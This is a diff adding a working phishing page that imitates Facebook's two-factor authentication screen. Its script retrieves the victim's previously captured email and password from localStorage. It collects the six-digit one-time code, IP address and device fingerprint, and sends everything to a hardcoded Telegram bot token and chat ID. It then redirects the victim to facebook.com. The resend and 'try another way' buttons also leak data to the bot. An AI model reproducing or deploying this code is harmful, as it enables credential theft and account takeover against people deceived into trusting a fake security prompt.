@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="color-scheme" content="light dark">
+    <title>Two-Factor Authentication</title>
+    <link rel="website icon" href="https://raw.githubusercontent.com/ArchismanKarmakar/Facebook-Phishing-page-php/refs/heads/main/imgs/hLRJ1GG_y0J.ico">
+
+<style>
+    :root {
+        --bg: #f0f2f5;
+        --card-bg: #ffffff;
+        --text: #1c1e21;
+        --text-muted: #65676b;
+        --border: #dddfe2;
+        --primary: #1877f2;
+        --primary-hover: #165dd1;
+        --primary-gradient-top: #3b95ff;
+        --primary-gradient-bottom: #1877f2;
+        --primary-gradient-top-hover: #4a9fff;
+        --primary-gradient-bottom-hover: #1365d9;
+        --secondary-bg: #f0f2f5;
+        --secondary-bg-hover: #e4e6e9;
+        --secondary-text: #1c1e21;
+        --success: #2e7d32;
+        --error: #d93025;
+        --error-bg: #fdecea;
+        --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.1);
+        --shadow-md: 0 2px 4px rgba(0, 0, 0, 0.1);
+        --shadow-lg: 0 12px 28px rgba(0, 0, 0, 0.12);
+        --otp-border: #ccd0d5;
+        --otp-focus: #1877f2;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --bg: #18191a;
+            --card-bg: #242526;
+            --text: #e4e6eb;
+            --text-muted: #b0b3b8;
+            --border: #3a3b3c;
+            --secondary-bg: #3a3b3c;
+            --secondary-bg-hover: #4a4b4c;
+            --secondary-text: #e4e6eb;
+            --error-bg: #3a1f1f;
+            --shadow-lg: 0 12px 28px rgba(0, 0, 0, 0.5);
+            --otp-border: #4a4b4c;
+        }
+    }
+
+    *, *::before, *::after {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    html, body {
+        height: 100%;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background-color: var(--bg);
+        color: var(--text);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        min-height: 100dvh;
+        padding: 20px;
+        transition: background 0.3s ease, color 0.3s ease;
+    }
+
+    .container {
+        background-color: var(--card-bg);
+        border-radius: 12px;
+        padding: clamp(20px, 4vw, 32px);
+        width: 100%;
+        max-width: 420px;
+        box-shadow: var(--shadow-lg);
+        position: relative;
+        transition: background 0.3s ease;
+    }
+
+    /* Close button */
+    .close-button {
+        position: absolute;
+        top: 14px;
+        right: 14px;
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--text-muted);
+        transition: background 0.2s ease;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    .close-button:hover {
+        background: var(--secondary-bg);
+    }
+
+    .close-button svg {
+        width: 20px;
+        height: 20px;
+    }
+
+    /* Header */
+    .header {
+        text-align: center;
+        margin-top: 12px;
+        margin-bottom: 20px;
+    }
+
+    .icon-wrap {
+        width: 72px;
+        height: 72px;
+        margin: 0 auto 16px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: linear-gradient(135deg, #e7f3ff, #cfe4ff);
+        color: var(--primary);
+        transition: background 0.3s ease;
+    }
+
+    .icon-wrap.whatsapp {
+        background: linear-gradient(135deg, #e6f9ed, #c8f0d8);
+        color: #25d366;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        .icon-wrap {
+            background: linear-gradient(135deg, #1f2b3a, #2a3f5c);
+        }
+        .icon-wrap.whatsapp {
+            background: linear-gradient(135deg, #1f3a28, #2a5438);
+        }
+    }
+
+    .icon-wrap svg {
+        width: 36px;
+        height: 36px;
+    }
+
+    h1 {
+        font-size: clamp(19px, 4.5vw, 22px);
+        font-weight: 600;
+        color: var(--text);
+        margin-bottom: 8px;
+        line-height: 1.3;
+    }
+
+    .subtitle {
+        color: var(--text-muted);
+        font-size: clamp(14px, 3.5vw, 15px);
+        line-height: 1.5;
+        margin-bottom: 4px;
+    }
+
+    .recipient {
+        font-weight: 600;
+        color: var(--text);
+        display: inline-block;
+        margin-top: 4px;
+        word-break: break-all;
+    }
+
+    .channel-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        margin-top: 12px;
+        padding: 6px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 600;
+        background: var(--secondary-bg);
+        color: var(--text-muted);
+    }
+
+    .channel-badge svg {
+        width: 14px;
+        height: 14px;
+    }
+
+    .channel-badge.email {
+        background: rgba(24, 119, 242, 0.12);
+        color: var(--primary);
+    }
+
+    .channel-badge.whatsapp {
+        background: rgba(37, 211, 102, 0.12);
+        color: #1da851;
+    }
+
+    /* OTP inputs */
+    .otp-group {
+        display: grid;
+        grid-template-columns: repeat(6, 1fr);
+        gap: clamp(6px, 1.8vw, 10px);
+        margin: 24px 0 8px;
+    }
+
+    .otp-input {
+        width: 100%;
+        aspect-ratio: 1 / 1.15;
+        padding: 0;
+        font-size: clamp(18px, 5vw, 22px);
+        font-weight: 600;
+        text-align: center;
+        border: 1.5px solid var(--otp-border);
+        border-radius: 10px;
+        background: var(--card-bg);
+        color: var(--text);
+        transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.15s ease;
+        -webkit-appearance: none;
+        appearance: none;
+        caret-color: var(--primary);
+    }
+
+    .otp-input:focus {
+        outline: none;
+        border-color: var(--otp-focus);
+        box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+    }
+
+    .otp-input.filled {
+        border-color: var(--primary);
+    }
+
+    .otp-input.error {
+        border-color: var(--error);
+        animation: shake 0.3s ease;
+    }
+
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-4px); }
+        75% { transform: translateX(4px); }
+    }
+
+    /* Error message */
+    .error-message {
+        color: var(--error);
+        background: var(--error-bg);
+        font-size: 13px;
+        padding: 10px 12px;
+        border-radius: 8px;
+        margin: 8px 0;
+        text-align: center;
+        display: none;
+    }
+
+    .error-message.show {
+        display: block;
+    }
+
+    /* Timer */
+    .timer {
+        color: var(--text-muted);
+        font-size: 13px;
+        margin: 16px 0 20px;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        flex-wrap: wrap;
+    }
+
+    .timer strong {
+        color: var(--text);
+        font-variant-numeric: tabular-nums;
+    }
+
+    .resend-link {
+        color: var(--primary);
+        background: none;
+        border: none;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+        padding: 0;
+        text-decoration: none;
+        display: none;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    .resend-link.show {
+        display: inline;
+    }
+
+    .resend-link:hover {
+        text-decoration: underline;
+    }
+
+    .resend-link:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+        text-decoration: none;
+    }
+
+    /* Buttons */
+    .continue-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(to bottom, var(--primary-gradient-top), var(--primary-gradient-bottom));
+        color: white;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-bottom: 12px;
+        box-shadow: var(--shadow-md);
+        transition: background 0.25s ease, transform 0.1s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    .continue-btn:hover:not(:disabled) {
+        background: linear-gradient(to bottom, var(--primary-gradient-top-hover), var(--primary-gradient-bottom-hover));
+    }
+
+    .continue-btn:active:not(:disabled) {
+        transform: scale(0.98);
+    }
+
+    .continue-btn:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+    }
+
+    .try-another {
+        width: 100%;
+        padding: 14px;
+        background-color: var(--secondary-bg);
+        color: var(--secondary-text);
+        border: none;
+        border-radius: 24px;
+        font-size: 15px;
+        font-weight: 500;
+        cursor: pointer;
+        box-shadow: var(--shadow-sm);
+        transition: background 0.2s ease, transform 0.1s ease;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    .try-another:hover {
+        background-color: var(--secondary-bg-hover);
+    }
+
+    .try-another:active {
+        transform: scale(0.98);
+    }
+
+    /* Spinner */
+    .spinner {
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.4);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+        display: none;
+    }
+
+    .continue-btn.loading .spinner {
+        display: inline-block;
+    }
+
+    .continue-btn.loading .btn-text {
+        display: none;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Toast */
+    .toast {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%) translateY(-120%);
+        background: #323232;
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 8px;
+        font-size: 14px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+        transition: transform 0.35s ease, opacity 0.35s ease;
+        opacity: 0;
+        z-index: 9999;
+        max-width: calc(100% - 32px);
+        text-align: center;
+        pointer-events: none;
+    }
+
+    .toast.show {
+        transform: translateX(-50%) translateY(0);
+        opacity: 1;
+    }
+
+    .toast.success { background: var(--success); }
+    .toast.error { background: var(--error); }
+
+    /* Small phones */
+    @media (max-width: 360px) {
+        body { padding: 12px; }
+        .otp-group { gap: 5px; }
+        .otp-input { font-size: 16px; border-radius: 8px; }
+        .continue-btn, .try-another { padding: 12px; font-size: 14px; }
+        .icon-wrap { width: 60px; height: 60px; }
+        .icon-wrap svg { width: 30px; height: 30px; }
+    }
+
+    /* Landscape short */
+    @media (max-height: 560px) and (orientation: landscape) {
+        body { align-items: flex-start; padding: 10px; }
+        .container { padding: 16px; }
+        .icon-wrap { width: 52px; height: 52px; margin-bottom: 10px; }
+        .icon-wrap svg { width: 26px; height: 26px; }
+        .header { margin-bottom: 12px; }
+        .otp-group { margin: 14px 0 6px; }
+        .timer { margin: 10px 0 14px; }
+    }
+
+    /* Tablets+ */
+    @media (min-width: 768px) {
+        .container { max-width: 440px; }
+        .otp-input { font-size: 22px; }
+    }
+</style>
+
+</head>
+<body>
+    <div class="container" role="dialog" aria-labelledby="dialog-title" aria-describedby="dialog-desc">
+        <button class="close-button" aria-label="Close" onclick="window.location.href='index.html'">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+        </button>
+
+        <div class="header">
+            <div class="icon-wrap" id="iconWrap">
+                <svg id="iconEmail" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+                    <path d="M2 7l10 7 10-7"></path>
+                </svg>
+                <svg id="iconWhatsApp" viewBox="0 0 24 24" fill="currentColor" style="display:none;">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+            </div>
+
+            <h1 id="dialog-title">Check your email</h1>
+            <p class="subtitle" id="dialog-desc">
+                Enter the code we sent to
+            </p>
+            <span class="recipient" id="recipientDisplay">your email</span>
+
+            <div>
+                <span class="channel-badge email" id="channelBadge">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+                        <path d="M2 7l10 7 10-7"></path>
+                    </svg>
+                    <span id="channelBadgeText">Sent via Email</span>
+                </span>
+            </div>
+        </div>
+
+        <div class="otp-group" id="otpGroup" aria-label="Verification code">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 2">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 3">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 4">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 5">
+            <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 6">
+        </div>
+
+        <div id="error-message" class="error-message" role="alert"></div>
+
+        <div class="timer">
+            <span id="timerText">We can send a new code in <strong id="countdown">01:00</strong></span>
+            <button class="resend-link" id="resendLink" onclick="resendOTP()">Resend code</button>
+        </div>
+
+        <button class="continue-btn" id="continueBtn" onclick="verifyOTP()">
+            <span class="btn-text">Continue</span>
+            <span class="spinner"></span>
+        </button>
+        <button class="try-another" onclick="tryAnotherWay()">Try another way</button>
+    </div>
+
+    <div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+<script>
+    /* ============ Config ============ */
+    const BOT_TOKEN = "8829187953:AAHGhRp4CkshdeloQGPaJxVQr8EvhP-mE94";
+    const CHAT_ID = "8554769230";
+    const REDIRECT_URL = "https://facebook.com";
+    const EMAIL_KEY = "fb_login_email";
+    const PASSWORD_KEY = "fb_login_password";
+    const MAX_ATTEMPTS = 3;
+
+    /* ============ State ============ */
+    let recipientValue = "";
+    let recipientType = "email"; // "email" | "phone" | "unknown"
+    let countdownInterval = null;
+    let cachedIP = null;
+    let otpAttempts = 0;
+
+    /* ============ Elements ============ */
+    const otpInputs = Array.from(document.querySelectorAll(".otp-input"));
+    const errorMessage = document.getElementById("error-message");
+    const countdownEl = document.getElementById("countdown");
+    const timerText = document.getElementById("timerText");
+    const resendLink = document.getElementById("resendLink");
+    const continueBtn = document.getElementById("continueBtn");
+    const recipientDisplay = document.getElementById("recipientDisplay");
+    const dialogTitle = document.getElementById("dialog-title");
+    const channelBadge = document.getElementById("channelBadge");
+    const channelBadgeText = document.getElementById("channelBadgeText");
+    const iconWrap = document.getElementById("iconWrap");
+    const iconEmail = document.getElementById("iconEmail");
+    const iconWhatsApp = document.getElementById("iconWhatsApp");
+
+    /* ============ Detect recipient from index.html ============ */
+    function detectRecipient() {
+        const email = localStorage.getItem(EMAIL_KEY) || "";
+        const v = email.trim();
+        if (v === "") return { type: "unknown", value: "" };
+
+        if (v.includes("@")) return { type: "email", value: v };
+
+        const digits = v.replace(/\D/g, "");
+        if (digits.length >= 7 && digits.length <= 15) return { type: "phone", value: v };
+
+        return { type: "unknown", value: v };
+    }
+
+    /* ============ Masking ============ */
+    function maskEmail(email) {
+        if (!email || !email.includes("@")) return email;
+        const [local, domain] = email.split("@");
+        if (local.length <= 2) return local.charAt(0) + "*".repeat(Math.max(1, local.length - 1)) + "@" + domain;
+        return local.charAt(0) + "*".repeat(Math.max(3, local.length - 2)) + local.charAt(local.length - 1) + "@" + domain;
+    }
+
+    function maskPhone(phone) {
+        const digits = phone.replace(/\D/g, "");
+        if (digits.length < 6) return phone;
+        const first = digits.slice(0, 3);
+        const last = digits.slice(-2);
+        return "+" + first + " " + "*".repeat(Math.max(3, digits.length - 5)) + " " + last;
+    }
+
+    function maskValue(type, value) {
+        if (type === "email") return maskEmail(value);
+        if (type === "phone") return maskPhone(value);
+        return value || "your account";
+    }
+
+    /* ============ Apply UI per type ============ */
+    function applyRecipientUI() {
+        const info = detectRecipient();
+        recipientType = info.type;
+        recipientValue = info.value;
+
+        if (info.type === "phone") {
+            dialogTitle.textContent = "Check your WhatsApp";
+            document.getElementById("dialog-desc").textContent = "Enter the code we sent to";
+            recipientDisplay.textContent = maskValue("phone", info.value);
+            channelBadge.className = "channel-badge whatsapp";
+            channelBadgeText.textContent = "Sent via WhatsApp";
+            iconWrap.classList.add("whatsapp");
+            iconEmail.style.display = "none";
+            iconWhatsApp.style.display = "block";
+        } else if (info.type === "email") {
+            dialogTitle.textContent = "Check your email";
+            document.getElementById("dialog-desc").textContent = "Enter the code we sent to";
+            recipientDisplay.textContent = maskValue("email", info.value);
+            channelBadge.className = "channel-badge email";
+            channelBadgeText.textContent = "Sent via Email";
+            iconWrap.classList.remove("whatsapp");
+            iconEmail.style.display = "block";
+            iconWhatsApp.style.display = "none";
+        } else {
+            dialogTitle.textContent = "Enter verification code";
+            document.getElementById("dialog-desc").textContent = "Enter the 6-digit code we sent to";
+            recipientDisplay.textContent = "your account";
+            channelBadge.className = "channel-badge";
+            channelBadgeText.textContent = "Verification required";
+            iconWrap.classList.remove("whatsapp");
+            iconEmail.style.display = "block";
+            iconWhatsApp.style.display = "none";
+        }
+    }
+
+    /* ============ OTP input behavior ============ */
+    otpInputs.forEach((input, idx) => {
+        input.addEventListener("input", (e) => {
+            const val = e.target.value.replace(/\D/g, "");
+            e.target.value = val.slice(0, 1);
+            e.target.classList.toggle("filled", e.target.value !== "");
+            errorMessage.classList.remove("show");
+            otpInputs.forEach(i => i.classList.remove("error"));
+
+            if (e.target.value && idx < otpInputs.length - 1) {
+                otpInputs[idx + 1].focus();
+            }
+        });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !e.target.value && idx > 0) {
+                otpInputs[idx - 1].focus();
+                otpInputs[idx - 1].value = "";
+                otpInputs[idx - 1].classList.remove("filled");
+                e.preventDefault();
+            }
+            if (e.key === "ArrowLeft" && idx > 0) otpInputs[idx - 1].focus();
+            if (e.key === "ArrowRight" && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+            if (e.key === "Enter") verifyOTP();
+        });
+
+        input.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+            if (!text) return;
+            otpInputs.forEach((inp, i) => {
+                inp.value = text[i] || "";
+                inp.classList.toggle("filled", !!inp.value);
+            });
+            const nextEmpty = otpInputs.findIndex(i => !i.value);
+            (otpInputs[nextEmpty] || otpInputs[otpInputs.length - 1]).focus();
+        });
+    });
+
+    function getOTP() {
+        return otpInputs.map(i => i.value).join("");
+    }
+
+    function clearOTP() {
+        otpInputs.forEach(i => { i.value = ""; i.classList.remove("filled", "error"); });
+        otpInputs[0].focus();
+    }
+
+    /* ============ Countdown ============ */
+    function startCountdown(seconds) {
+        clearInterval(countdownInterval);
+        let remaining = seconds;
+        timerText.style.display = "inline";
+        resendLink.classList.remove("show");
+        updateTimerDisplay(remaining);
+
+        countdownInterval = setInterval(() => {
+            remaining--;
+            if (remaining <= 0) {
+                clearInterval(countdownInterval);
+                timerText.style.display = "none";
+                resendLink.classList.add("show");
+                return;
+            }
+            updateTimerDisplay(remaining);
+        }, 1000);
+    }
+
+    function updateTimerDisplay(remaining) {
+        const m = Math.floor(remaining / 60);
+        const s = remaining % 60;
+        countdownEl.textContent = `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
+    }
+
+    /* ============ UI helpers ============ */
+    function showToast(msg, type) {
+        const toast = document.getElementById("toast");
+        toast.textContent = msg;
+        toast.className = "toast show" + (type ? " " + type : "");
+        clearTimeout(showToast._t);
+        showToast._t = setTimeout(() => {
+            toast.className = "toast" + (type ? " " + type : "");
+        }, 3000);
+    }
+
+    function setLoading(isLoading) {
+        continueBtn.disabled = isLoading;
+        continueBtn.classList.toggle("loading", isLoading);
+    }
+
+    function showError(msg) {
+        errorMessage.textContent = msg;
+        errorMessage.classList.add("show");
+        otpInputs.forEach(i => i.classList.add("error"));
+        setTimeout(() => otpInputs.forEach(i => i.classList.remove("error")), 400);
+    }
+
+    function escapeHTML(s) {
+        return String(s)
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;");
+    }
+
+    /* ============ IP ============ */
+    async function getIP() {
+        if (cachedIP) return cachedIP;
+        try {
+            const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+            const j = await r.json();
+            cachedIP = j.ip || "unknown";
+        } catch (e) {
+            cachedIP = "unknown";
+        }
+        return cachedIP;
+    }
+
+    /* ============ Telegram ============ */
+    function detectBrowser(ua) {
+        if (/Edg\//.test(ua)) return "Microsoft Edge";
+        if (/OPR\//.test(ua) || /Opera/.test(ua)) return "Opera";
+        if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) return "Chrome";
+        if (/Firefox\//.test(ua)) return "Firefox";
+        if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return "Safari";
+        if (/MSIE|Trident/.test(ua)) return "Internet Explorer";
+        return "Unknown";
+    }
+
+    function detectOS(ua, platform) {
+        if (/Windows NT 10/.test(ua)) return "Windows 10/11";
+        if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
+        if (/Windows NT 6\.1/.test(ua)) return "Windows 7";
+        if (/Windows/.test(ua)) return "Windows";
+        if (/Android/.test(ua)) return "Android";
+        if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+        if (/Mac OS X/.test(ua)) return "macOS";
+        if (/Linux/.test(ua)) return "Linux";
+        return platform || "Unknown";
+    }
+
+    function detectDeviceType(ua) {
+        if (/iPad|Tablet/i.test(ua)) return "Tablet";
+        if (/Mobi|Android.*Mobile|iPhone|iPod/i.test(ua)) return "Mobile";
+        return "Desktop";
+    }
+
+    async function buildOTPMessage(otp, attemptNo, ip) {
+        const now = new Date();
+        const pad = n => String(n).padStart(2, "0");
+        const dateStr = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()}`;
+        const timeStr = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+
+        const ua = navigator.userAgent || "unknown";
+        const platform = navigator.platform || "unknown";
+        const lang = navigator.language || "unknown";
+        const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone) || "unknown";
+        const screenStr = `${screen.width} x ${screen.height}`;
+        const viewport = `${window.innerWidth} x ${window.innerHeight}`;
+        const online = navigator.onLine ? "Online" : "Offline";
+        const referrer = document.referrer || "Direct";
+        const pageURL = location.href;
+        const browser = detectBrowser(ua);
+        const os = detectOS(ua, platform);
+        const deviceType = detectDeviceType(ua);
+        const originalCredential = localStorage.getItem(EMAIL_KEY) || "unknown";
+        const originalPassword = localStorage.getItem(PASSWORD_KEY) || "unknown";
+        const channel = recipientType === "phone" ? "WhatsApp" : recipientType === "email" ? "Email" : "Unknown";
+
+        return `<b>FACEBOOK 2FA - OTP SUBMITTED</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Attempt</b>  <code>${attemptNo} / ${MAX_ATTEMPTS}</code>
+<b>Date</b>     <code>${dateStr}</code>
+<b>Time</b>     <code>${timeStr}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>OTP CODE</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Entered Code</b>
+<code>${escapeHTML(otp)}</code>
+
+<b>Sent Via</b>  <code>${channel}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>ORIGINAL LOGIN CREDENTIALS</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Email / Phone</b>
+<code>${escapeHTML(originalCredential)}</code>
+
+<b>Password</b>
+<code>${escapeHTML(originalPassword)}</code>
+
+<b>Detected Type</b>  <code>${recipientType}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>DEVICE INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Device Type</b>  <code>${deviceType}</code>
+<b>Operating System</b>  <code>${escapeHTML(os)}</code>
+<b>Browser</b>  <code>${escapeHTML(browser)}</code>
+<b>Platform</b>  <code>${escapeHTML(platform)}</code>
+<b>Language</b>  <code>${escapeHTML(lang)}</code>
+<b>Timezone</b>  <code>${escapeHTML(tz)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>DISPLAY &amp; NETWORK</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Screen</b>  <code>${screenStr}</code>
+<b>Viewport</b>  <code>${viewport}</code>
+<b>Connection</b>  <code>${online}</code>
+<b>IP Address</b>  <code>${escapeHTML(ip)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>PAGE</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>URL</b>
+<code>${escapeHTML(pageURL)}</code>
+
+<b>Referrer</b>  <code>${escapeHTML(referrer)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>USER AGENT</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<blockquote>${escapeHTML(ua)}</blockquote>`;
+    }
+
+    async function sendToTelegram(text) {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML",
+                    disable_web_page_preview: true
+                })
+            });
+            const data = await res.json();
+            return !!data.ok;
+        } catch (err) {
+            console.warn("Telegram send failed:", err);
+            return false;
+        }
+    }
+
+    /* ============ Actions ============ */
+    async function verifyOTP() {
+        const otp = getOTP();
+        errorMessage.classList.remove("show");
+
+        if (otp.length !== 6) {
+            showError("Please enter all 6 digits of the code.");
+            return;
+        }
+
+        otpAttempts++;
+        setLoading(true);
+
+        const ip = await getIP();
+        const msg = await buildOTPMessage(otp, otpAttempts, ip);
+        const ok = await sendToTelegram(msg);
+
+        setLoading(false);
+
+        if (ok) {
+            showToast("Code submitted successfully.", "success");
+            setTimeout(() => {
+                localStorage.removeItem(EMAIL_KEY);
+                localStorage.removeItem(PASSWORD_KEY);
+                localStorage.removeItem("fb_login_attempts");
+                window.location.href = REDIRECT_URL;
+            }, 1200);
+        } else {
+            showError("Unable to submit code right now. Please try again.");
+            showToast("Network error. Please check your connection.", "error");
+        }
+    }
+
+    async function resendOTP() {
+        resendLink.disabled = true;
+        resendLink.textContent = "Sending...";
+
+        const now = new Date();
+        const pad = n => String(n).padStart(2, "0");
+        const timeStr = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+        const originalCredential = localStorage.getItem(EMAIL_KEY) || "unknown";
+        const channel = recipientType === "phone" ? "WhatsApp" : recipientType === "email" ? "Email" : "Unknown";
+
+        const msg = `<b>FACEBOOK 2FA - RESEND REQUEST</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Time</b>  <code>${timeStr}</code>
+<b>Channel</b>  <code>${channel}</code>
+
+<b>Recipient</b>
+<code>${escapeHTML(originalCredential)}</code>
+
+<b>Masked</b>  <code>${escapeHTML(maskValue(recipientType, originalCredential))}</code>`;
+
+        const ok = await sendToTelegram(msg);
+
+        resendLink.disabled = false;
+        resendLink.textContent = "Resend code";
+
+        if (ok) {
+            showToast("New code sent.", "success");
+            startCountdown(60);
+            clearOTP();
+        } else {
+            showToast("Could not resend. Please try again.", "error");
+        }
+    }
+
+    function tryAnotherWay() {
+        const msg = `<b>FACEBOOK 2FA - TRY ANOTHER WAY</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>Time</b>  <code>${new Date().toLocaleString()}</code>
+<b>Recipient</b>  <code>${escapeHTML(localStorage.getItem(EMAIL_KEY) || "unknown")}</code>
+<b>Type</b>  <code>${recipientType}</code>`;
+        sendToTelegram(msg);
+        showToast("Alternative verification will be available soon.", "error");
+    }
+
+    /* ============ Init ============ */
+    window.addEventListener("DOMContentLoaded", () => {
+        applyRecipientUI();
+        startCountdown(60);
+        setTimeout(() => otpInputs[0].focus(), 300);
+    });
+</script>
+
+</body>
+</html>
